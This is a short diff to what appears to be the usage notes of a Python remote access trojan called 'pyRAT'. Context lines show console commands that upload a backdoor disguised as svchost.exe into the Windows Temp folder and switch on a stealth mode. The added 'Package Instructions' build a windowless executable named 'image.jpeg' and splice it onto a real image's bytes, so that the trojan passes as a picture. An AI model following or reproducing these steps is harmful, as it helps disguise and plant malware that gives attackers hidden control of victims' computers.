@@ -45,3 +45,15 @@ RAT> upload backdoor.exe C:\\Windows\\Temp\\svchost.exe
 # Enable stealth mode
 RAT> stealth on
 
+
+
+# Package Instructions
+> pyinstaller --onefile --noconsole --name "image.jpeg" --add-data "image.jpeg;." wrapper.py
+>
+> $imageBytes = [System.IO.File]::ReadAllBytes("image.jpeg")
+> 
+> $exeBytes = [System.IO.File]::ReadAllBytes("pyRAT\dist\image.jpeg.exe")
+> 
+> [System.IO.File]::WriteAllBytes("FINAL_image.jpeg", $imageBytes + $exeBytes)
+
+
